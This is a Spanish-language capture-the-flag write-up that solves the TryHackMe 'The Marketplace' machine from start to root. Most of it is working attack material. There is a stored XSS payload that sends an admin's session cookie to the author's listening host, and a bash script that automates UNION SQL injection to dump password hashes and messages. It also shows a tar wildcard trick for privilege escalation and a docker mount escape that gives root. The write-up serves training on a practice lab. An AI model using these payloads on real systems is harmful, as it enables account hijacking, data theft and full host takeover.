---
layout: single
title: The Marketplace - Try Hack Me
excerpt: "En esta máquina empezamos reconociendo una web con algunas publicaciones, pasando desde un XSS hasta obtener RCE"
date: 2021-08-17
classes: wide
header:
  teaser: /assets/images/thm-writeup-the-marketplace/TheMarketplace.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.png
categories:
  - tryhackme
  - scripting
  - writeup
tags:
  - bash scripting
  - web
  - sqli
  - xss
  - csrf
  - docker
---

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img_header.png">
</p>

Esta es una máquina de nivel medio según la plataforma

Bien, lo primero que hacemos para empezar es lanzarle una traza ICMP a la máquina para verificar que se encuentra activa

```bash
ping -c 1 [IP]
```
```bash
PING 10.10.140.35 (10.10.140.35) 56(84) bytes of data.
64 bytes from 10.10.140.35: icmp_seq=1 ttl=63 time=189 ms

--- 10.10.140.35 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 189.081/189.081/189.081/0.000 ms
```
Una vez comprobamos que la máquina se encuentra activa y en base al ttl reconocemos que el sistema operativo es linux continuamos haciendo un escaneo de puertos, para la resolución de máquinas yo acustumbro a usar nmap de la siguiente manera:

```bash
nmap -p- --open -T5 -sV -v -n [IP]
```
de esta manera se realizará un escaneo de todo el tango de puertos y se listarán solo los que tengan un estado abierto seguido del servicio que corre cada uno de ellos, dependiendo de la velocidad del escaneo puedes variarlo a tu gusto con el parametro -T o con --min-rate especificando el mínimo de paquetes que quieras que se emitan por segundo, ej: --min-rate 6000

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 16:03 -05
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 16:03
Scanning 10.10.140.35 [4 ports]
Completed Ping Scan at 16:03, 0.23s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:03
Scanning 10.10.140.35 [65535 ports]
Discovered open port 80/tcp on 10.10.140.35
Discovered open port 22/tcp on 10.10.140.35
Discovered open port 32768/tcp on 10.10.140.35
Completed SYN Stealth Scan at 16:05, 98.83s elapsed (65535 total ports)
Initiating Service scan at 16:05
Scanning 3 services on 10.10.140.35
Completed Service scan at 16:05, 11.97s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.140.35.
Initiating NSE at 16:05
Completed NSE at 16:05, 0.85s elapsed
Initiating NSE at 16:05
Completed NSE at 16:05, 0.78s elapsed
Nmap scan report for 10.10.140.35
Host is up (0.23s latency).
Not shown: 65532 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.33 seconds
           Raw packets sent: 196680 (8.654MB) | Rcvd: 46 (2.008KB)
```
Podemos ver como se nos reportan 3 puertos abiertos externamente, el 22 (ssh), 80 (http) y el 32768 (http)

Al no tener credenciales validas para intentar conectarnos por ssh vamos a efectuar un reconocimiento básico de la web con whatweb

```bash
whatweb http://[IP]
```
```bash
http://10.10.140.35 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.19.2], IP[10.10.140.35],
Title[The Marketplace], X-Powered-By[Express], nginx[1.19.2]
```
Así a simple vista no vemos nada de interes, como algún gestor de contenido o algún potencial usuario

si efectuamos el mismo reconocimiento a la web por el puerto 32768, que es el otro puerto que vimos que corre un servicio http, tampoco vemos nada que nos llame la atención

```bash
whatweb http://[IP]:32768
```
```bash
http://10.10.140.35:32768 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.140.35], Title[The Marketplace],
X-Powered-By[Express]
```
así que vamos a analizar la web directamente desde el navegador

Al abrirla podemos ver que hay algunas publicaciones hechas de algunos productos, justo debajo de ellas podemos ver los nombres de los usuarios que realizaron la publicación y adicionalmente podemos acceder a algunos apartados de la web como al inicio, el registro y el login
<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img1.png">
</p>
viendo las publicaciones no hay nada interesante, a demás de los potenciales usuarios que ya habíamos visto, así que me dirijo a la sección de registro que luce de la siguiente manera:

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img2.png">
</p>

nos registramos con un nombre de usuario cualquiera y una contraseña

Una vez registrado y logeado vemos que tenemos disponibles nuevas secciones de la web, ahora podemos crear publicaciones y ver nuestros mensajes, a parte de poder reportar publicaciones al usuario administrador

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img3.png">
</p>

Si entramos en new listing vemos que aparte de poder poner un titulo y una descripción a la publicación que queremos crear, hay un botón que sirve para subir archivos a la web, pero está desactivado

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img4.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img5.png">
</p>

Este lo podemos activar desde las herramientas del navegador y dejarlo funcional para posteriormente subir una reverse shell, pero no vale la pena hacerlo porque no nos funcionará

Entonces ya que podemos crear publicaciones con el contenido que queramos probé con XSS a ver si se interpretaba el código en la publicación

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img6.png">
</p>

y comprobamos que funcionó

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img7.png">
</p>

Ya sabiendo que es vulnerable y recordando que podemos reportar publicaciones al usuario administrador, pensé en que los tiros iban por un CSRF, así que creé una publicación con el siguiente contenido:

```html
<script>document.write("<img src='http://10.9.242.217/imagen.jpg?cookie=" + document.cookie + "'>")</script>
```

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img8.png">
</p>

esto lo que hará es enviarme la cookie de sesión del usuario que abra la publicación por medio de una petición get a un recurso (imagen.jpg) a mi máquina de atacante, por lo tanto antes de hacer el reporte de la publicación debo iniciar un servidor http con python de la siguiente manera:

```bash
python3 -m http.server 80
```
Reportamos la publicación

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img9.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img10.png">
</p>

y obtenemos la cookie del usuario administrador por consola

```bash
~$> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.140.35 - - [17/Aug/2021 16:56:43] code 404, message File not found
10.10.140.35 - - [17/Aug/2021 16:56:43] "GET /imagen.jpg?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjkyMzc0MDN9.eyoUCIc4jmxJpVs82X9FhkFR5WhZFDrG-pk1zS0oWcM HTTP/1.1" 404 -
```

Una vez obtenida la cookie efectuamos un cookie hijacking, en mi caso, lo hago desde el apartado de almacenamiento de la página, pero tambien se puede hacer con herramientas como EditThisCookie

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img11.png">
</p>

Luego de esto, recargamos la página y vemos que se nos habilita una nueva sección de la web, el panel de administración

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img12.png">
</p>

Si seleccionamos algún usuario podemos ver un poco de información, pero lo más importante es que en la URL vemos algo que puede ser muy interesante

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img13.png">
</p>

Si probamos ingresando un valor erroneo en user=, como por ejemplo -1, podemos ver como se nos lista un error de sintaxis de mysql, lo que quiere decir que es vulnerable a sql-injection

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img14.png">
</p>

Hacemos un ordenamiento para determinar el número de columnas

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img15.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-the-marketplace/img16.png">
</p>

y ya sabiendo que son 4 podríamos ir listando tabla por tabla hasta encontrar algo que nos interese, pero eso podría llegar a ser algo tardado, así que lo que hice fue crear un pequeño script en bash que me automatice el proceso de listado de tablas, columnas y campos (Aquí abajo dejo el código)

```bash
#!/bin/bash

#Colors
greenColor="\e[0;32m\033[1m"
endColor="\033[0m\e[0m"
redColor="\e[0;31m\033[1m"
blueColor="\e[0;34m\033[1m"
yellowColor="\e[0;33m\033[1m"
purpleColor="\e[0;35m\033[1m"
turquoiseColor="\e[0;36m\033[1m"
grayColor="\e[0;37m\033[1m"

function ctrl_c(){
	echo -e "\n\n${redColor}[!] Exiting...${endColor}\n"
	tput cnorm; exit 1
}

trap ctrl_c INT

tput civis

function helpPanel(){
	echo -e "\n${redColor}[!] Use: $0"
	for i in $(seq 1 80); do echo -ne ${redColor}-${endColor}; done
	echo -e "\n\n\t${blueColor}[-c]${endColor} ${yellowColor}Cookie${endColor}"
	echo -e "\t${blueColor}[-e]${endColor}${yellowColor} Extract${endColor}"
	echo -e "\t\t${purpleColor}tables${endColor}"
	echo -e "\t\t${purpleColor}columns${endColor}"
	echo -e "\t\t\t${blueColor}[-t]${endColor} ${yellowColor}Table name${endColor}"
	echo -e "\t\t${purpleColor}fields${endColor}"
	echo -e "\t\t\t${blueColor}[-f]${endColor} ${yellowColor}Fields names${endColor}${blueColor} (ceparate by ${endColor}${purpleColor},${endColor}${blueColor})${endColor}"
	echo -e "\t${blueColor}[-n]${endColor}${yellowColor} Number output${endColor}"
	echo -e "\t${blueColor}[-h]${endColor}${yellowColor} Show this help panel${endColor}"
	echo -e "\n\t${purpleColor}Use examples:${endColor}"
	echo -e "\t\t${yellowColor}$0${endColor} ${blueColor}-c${endColor} ${yellowColor}eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO${endColor} ${blueColor}-e${endColor} ${yellowColor}tables${endColor} ${blueColor}-n${endColor} ${yellowColor}80${endColor}"
	echo -e "\t\t${yellowColor}$0${endColor} ${blueColor}-c${endColor} ${yellowColor}eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO${endColor} ${blueColor}-e${endColor} ${yellowColor}columns${endColor} ${blueColor}-t${endColor} ${yellowColor}Users${endColor} ${blueColor}-n${endColor} ${yellowColor}30${endColor}"
	echo -e "\t\t${yellowColor}$0${endColor} ${blueColor}-c${endColor} ${yellowColor}eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO${endColor} ${blueColor}-e${endColor} ${yellowColor}fields${endColor} ${blueColor}-f${endColor} ${yellowColor}id,user,password${endColor} ${blueColor}-t${endColor} ${yellowColor}Users${endColor} ${blueColor}-n${endColor} ${yellowColor}10${endColor}\n"

	tput cnorm
}

declare -r url="http://127.0.0.1" # <- CHANGE THIS

function extractTables(){
	echo
	for i in $(seq 0 $number_output); do
		echo -ne "\n${yellowColor}[${endColor}${greenColor}+${endColor}${yellowColor}] Table [${endColor}${greenColor}$i${endColor}${yellowColor}]:${endColor} "
		curl -s -H "Cookie: token=$token" -X GET "$url/admin?user=-1+union+select+null,table_name,null,null+from+information_schema.tables+limit+$i,1+--+-" | grep "User" | tail -n 1 | awk '{print $2}'
	done; tput cnorm
}

function extractColumns(){
	echo
	for i in $(seq 0 $number_output); do
		echo -ne "\n${yellowColor}[${endColor}${greenColor}+${endColor}${yellowColor}] Column [${endColor}${greenColor}$i${endColor}${yellowColor}]:${endColor} "
		curl -s -H "Cookie: token=$token" -X GET "$url/admin?user=-1+union+select+null,column_name,null,null+from+information_schema.columns+where+table_name='$table'+limit+$i,1+--+-" | grep "User" | tail -n 1 | awk '{print $2}'
	done; tput cnorm
}

function extractFields(){
	declare -r fields=$(echo $fields | sed 's/,/,0x3a,/g')

        echo
        for i in $(seq 0 $number_output); do
                echo -ne "\n${yellowColor}[${endColor}${greenColor}+${endColor}${yellowColor}] Field [${endColor}${greenColor}$i${endColor}${yellowColor}]:${endColor}"
                curl -s -H "Cookie: token=$token" -X GET "$url/admin?user=-1+union+select+concat($fields),null,null,null+from+$table+limit+$i,1+--+-" | grep "ID" -A 50 | grep "Is administrator:" -B 15 | grep -v "Is administrator:" | sed "s/ID://" | sed "s/<br />/g" | tr -d ">/>" | sed "s/           / /g"
        done; tput cnorm
}

declare -i parameter_counter=0; while getopts ":c:e:t:f:n:h:" arg; do
	case $arg in
		c) token=$OPTARG; let parameter_counter+=1;;
		e) extract=$OPTARG; let parameter_counter+=1;;
		t) table=$OPTARG; let parameter_counter+=1;;
		f) fields=$OPTARG; let parameter_counter+=1;;
		n) number_output=$OPTARG; let parameter_counter+=1;;
		h) help;;
	esac
done

if [ $parameter_counter -eq 0 ]; then
	helpPanel
else
	if [ "$(echo $extract)" == "tables" ]; then
		if [ ! "$number_output" ]; then
			number_output=100
			extractTables $number_output
		else
			extractTables $number_output
		fi
	elif [ "$(echo $extract)" == "columns" ]; then
		if [ ! "$number_output" ]; then
			number_output=50
			extractColumns $number_output
		else
			extractColumns $number_output
		fi
	elif [ "$(echo $extract)" == "fields" ]; then
		if [ ! "$number_output" ]; then
			number_output=30
			extractFields $number_output
		else
			extractFields $number_output
		fi
	fi
fi
```

Se ve de la siguiente manera:

```bash
~$>./sqli.sh

[!] Use: ./sqli.sh
--------------------------------------------------------------------------------

        [-c] Cookie
        [-e] Extract
                tables
                columns
                        [-t] Table name
                fields
                        [-f] Fields names (ceparate by ,)
        [-n] Number output
        [-h] Show this help panel

        Use examples:
                ./sqli.sh -c eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO -e tables -n 80
                ./sqli.sh -c eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO -e columns -t Users -n 30
                ./sqli.sh -c eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO -e fields -f id,user,password -t Users -n 10
```

Lo primero que deberías hacer es cambiar la ip que está por defecto en el código del script por la IP que tengas asignada en tu máquina víctima

```bash
declare -r url="http://127.0.0.1" # <- CHANGE THIS
```
Una vez hecho esto empezaremos a listar las tablas existentes en la base de datos usando nuestra herramienta de la siguiente manera:

```bash
~$>./sqli.sh -c COOKIE_DEL_USUARIO_ADMINISTRADOR -e tables -n 80
```
```bash
[+] Table [0]: ADMINISTRABLE_ROLE_AUTHORIZATIONS

[+] Table [1]: APPLICABLE_ROLES					[+] Table [41]: INNODB_TABLESTATS

[+] Table [2]: CHARACTER_SETS					[+] Table [42]: INNODB_TEMP_TABLE_INFO

[+] Table [3]: CHECK_CONSTRAINTS				[+] Table [43]: INNODB_TRX

[+] Table [4]: COLLATIONS					[+] Table [44]: INNODB_VIRTUAL

[+] Table [5]: COLLATION_CHARACTER_SET_APPLICABILITY		[+] Table [45]: KEYWORDS

[+] Table [6]: COLUMNS						[+] Table [46]: KEY_COLUMN_USAGE

[+] Table [7]: COLUMNS_EXTENSIONS				[+] Table [47]: OPTIMIZER_TRACE

[+] Table [8]: COLUMN_PRIVILEGES				[+] Table [48]: PARAMETERS

[+] Table [9]: COLUMN_STATISTICS				[+] Table [49]: PARTITIONS

[+] Table [10]: ENABLED_ROLES					[+] Table [50]: PLUGINS

[+] Table [11]: ENGINES						[+] Table [51]: PROCESSLIST

[+] Table [12]: EVENTS						[+] Table [52]: PROFILING

[+] Table [13]: FILES						[+] Table [53]: REFERENTIAL_CONSTRAINTS

[+] Table [14]: INNODB_BUFFER_PAGE				[+] Table [54]: RESOURCE_GROUPS

[+] Table [15]: INNODB_BUFFER_PAGE_LRU				[+] Table [55]: ROLE_COLUMN_GRANTS

[+] Table [16]: INNODB_BUFFER_POOL_STATS			[+] Table [56]: ROLE_ROUTINE_GRANTS

[+] Table [17]: INNODB_CACHED_INDEXES				[+] Table [57]: ROLE_TABLE_GRANTS

[+] Table [18]: INNODB_CMP					[+] Table [58]: ROUTINES

[+] Table [19]: INNODB_CMPMEM					[+] Table [59]: SCHEMATA

[+] Table [20]: INNODB_CMPMEM_RESET				[+] Table [60]: SCHEMA_PRIVILEGES

[+] Table [21]: INNODB_CMP_PER_INDEX				[+] Table [61]: STATISTICS

[+] Table [22]: INNODB_CMP_PER_INDEX_RESET			[+] Table [62]: ST_GEOMETRY_COLUMNS

[+] Table [23]: INNODB_CMP_RESET				[+] Table [63]: ST_SPATIAL_REFERENCE_SYSTEMS

[+] Table [24]: INNODB_COLUMNS					[+] Table [64]: ST_UNITS_OF_MEASURE

[+] Table [25]: INNODB_DATAFILES				[+] Table [65]: TABLES

[+] Table [26]: INNODB_FIELDS					[+] Table [66]: TABLESPACES

[+] Table [27]: INNODB_FOREIGN					[+] Table [67]: TABLESPACES_EXTENSIONS

[+] Table [28]: INNODB_FOREIGN_COLS				[+] Table [68]: TABLES_EXTENSIONS

[+] Table [29]: INNODB_FT_BEING_DELETED				[+] Table [69]: TABLE_CONSTRAINTS

[+] Table [30]: INNODB_FT_CONFIG				[+] Table [70]: TABLE_CONSTRAINTS_EXTENSIONS

[+] Table [31]: INNODB_FT_DEFAULT_STOPWORD			[+] Table [71]: TABLE_PRIVILEGES

[+] Table [32]: INNODB_FT_DELETED				[+] Table [72]: TRIGGERS

[+] Table [33]: INNODB_FT_INDEX_CACHE				[+] Table [73]: USER_ATTRIBUTES

[+] Table [34]: INNODB_FT_INDEX_TABLE				[+] Table [74]: USER_PRIVILEGES

[+] Table [35]: INNODB_INDEXES					[+] Table [75]: VIEWS

[+] Table [36]: INNODB_METRICS					[+] Table [76]: VIEW_ROUTINE_USAGE

[+] Table [37]: INNODB_SESSION_TEMP_TABLESPACES			[+] Table [77]: VIEW_TABLE_USAGE

[+] Table [38]: INNODB_TABLES					[+] Table [78]: items

[+] Table [39]: INNODB_TABLESPACES				[+] Table [79]: messages

[+] Table [40]: INNODB_TABLESPACES_BRIEF			[+] Table [80]: users
```
Luego de eso podemos ver que en total se nos listan 80 tablas, de las cuales me llaman la atención 2, users y messages, así que ahora continuaremos listando las columnas de la tabla users de la siguiente manera:

```bash
~$>./sqli.sh -c COOKIE_DEL_USUARIO_ADMINISTRADOR -e columns -t users -n 3
```

```bash
[+] Column [0]: id

[+] Column [1]: username

[+] Column [2]: password

[+] Column [3]: isAdministrator
```
vemos que solo se nos listan 4 columnas (id, username, password, isAdministrator) Veamos la información de los campos que nos interese de las columnas anteriormente encontradas, en mi caso listaré el username y password tal que así:

```bash
~$>./sqli.sh -c COOKIE_DEL_USUARIO_ADMINISTRADOR -e fields -f username,password -t users -n 3
```

```bash
[+] Field [0]: system:$2b$10$83pRYaRd4ZWJVEex.lxu.Xs1aTNDBWIUmB4z.R0DT0MSGIGzsgW 

[+] Field [1]: michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf1q 

[+] Field [2]: jake:$2b$10$DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG 

[+] Field [3]: invertebrado:$2b$10$vP.vcNPPHhKVIQ.1vkjGM.4iFwZXksK5zVBBcUHe6upQoh7B.XW
```

Luego de esto podemos ver que en total hay 4 usuarios system,michael,jake,Invertebrado(el usuario que creamos al inicio) seguidos de unos hashes los cuales intenté crackear usando jhon con el diccionario rockyou, pero estaba tardando demasiado así que decidí cancelarlo y recordé que a demás de la tabla users había otra que se veía interesante (messages), entonces dumpee las columnas de esa tabla

```bash
~$>./sqli.sh -c COOKIE_DEL_USUARIO_ADMINISTRADOR -e columns -t messages -n 4
```

```bash
[+] Column [0]: id

[+] Column [1]: user_from

[+] Column [2]: user_to

[+] Column [3]: message_content

[+] Column [4]: is_read
```

ahí vemos las columnas que contiene, ahora sigue extraer los campos de interes

```bash
~$>./sqli.sh -c COOKIE_DEL_USUARIO_ADMINISTRADOR -e fields -f user_from,user_to,message_content -t messages -n 2
```

```bash
[+] Field [0]: 1:3:Hello!
An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.
Your new password is: @<***CENSORED***>J 

[+] Field [1]: 1:4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! 

[+] Field [2]: 1:4:Thank you for your report. We have reviewed the listing and found nothing that violates our rules.
```

Al hacer esto podemos ver que hay 4 mensajes de los cuales el único que nos interesa es el primero, aquí podemos ver una clave de ssh que el usuario 1 (system) le proporciona al usuario 3 (jake), el orden de los usuarios es el mismo que vimos cuando dumpeamos los usuarios con sus hashes

Probamos a conectarnos por ssh como el usuario jake para validar que la calve es valida

```bash
~$> ssh jake@[IP]
```

```bash
The authenticity of host '10.10.140.35 (10.10.140.35)' can't be established.
ECDSA key fingerprint is SHA256:nRz0NCvN/WNh5cE3/dccxy42AXrwcJInG2n8nBWtNtg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.140.35' (ECDSA) to the list of known hosts.
jake@10.10.140.35's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug 17 23:08:12 UTC 2021

  System load:  0.0                Users logged in:                0
  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.140.35
  Memory usage: 28%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1
  Processes:    96

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.


jake@the-marketplace:~$
```

Y estamos dentro!, ahora puedes leer la flag user.txt en el directorio personal de michael Luego de esto listé los archivos que tubiesen permisos SUID, pero no encontré ninguno que fuese interesante

```bash
jake@the-marketplace:~$ cat user.txt 
THM{<***CENSORED***>}
```

Entonces viendo que podemos hacer como root siendo jake nos encontramos con algo que puede ser interesante

```bash
jake@the-marketplace:~$ sudo -l
```

```bash
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

podemos ejecutar un script, si leemos el código del script vemos un potencial vector de ataque, un wiledcard (*), así que se viene privileges scalation con wiledcard

```bash
jake@the-marketplace:~$ cat /opt/backups/backup.sh
```
```bash
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

En este script está usando tar diciendole que englobe todo lo disponible en el directorio actual con el wiledcard, así que nos aprobechamos de 2 parametros que tiene tar con los que se pueden ejecutar comandos para crear los siguientes archivos:

```bash
jake@the-marketplace:/opt/backups~$ echo "" > --checkpoint=1 && echo "" > --checkpoint-action=exec=bash
```
```bash
jake@the-marketplace:/opt/backups~$ ls
backup.sh   backup.tar  '--checkpoint=1'  '--checkpoint-action=exec=bash'
```

esto ará que tar tome los archivos como parametros del mismo y ejecute la instrucción que se le indique (en este caso exec=bash) luego de esto eliminamos el archivo backup.tar

```bash
jake@the-marketplace:/opt/backups~$ rm backup.tar
```

esto para evitar el siguiente error:

```bash
jake@the-marketplace:/opt/backups$ sudo -u michael ./backup.sh
Backing up files...
tar: /opt/backups/backup.tar: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
```

ejecutamos el script como el usuario michael

```bash
jake@the-marketplace:/opt/backups$ sudo -u michael ./backup.sh
Backing up files...
```

y ahora somos el usuario michael, excelente trabajo

```bash
michael@the-marketplace:/opt/backups$ whoami
michael
```

Pero todavía falta conseguir la flag del usuario root, así que vamos a eso

viendo en que grupos está michael vemos uno muy llamativo del que podemos abusar para convertirnos en root, el grupo docker, así que directamente listamos las imagenes que hay

```bash
michael@the-marketplace:/opt/backups$ docker images
```

```bash
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        11 months ago       2.16GB
nginx                        latest              4bb46517cac3        12 months ago       133MB
node                         lts-buster          9c4cc2688584        12 months ago       886MB
mysql                        latest              0d64f46acfd1        12 months ago       544MB
alpine                       latest              a24bb4013296        14 months ago       5.57MB
```

y usamos alpine para crear una montura de la raiz en mnt para poder visualizar la flag root.txt

```bash
michael@the-marketplace:/opt/backups$ docker run --rm -it --network bridge -v /:/mnt --name rooted alpine sh
```
```bash
/ # whoami
root
```
Ahora vemos que estamos en un contenedor como el usuario root en donde podemos meternos en mnt, luego en el directorio root y leer la flag

```bash
/ # cd /mnt/root
/mnt/root # cat root.txt
THM{<***CENSORED***>}
```
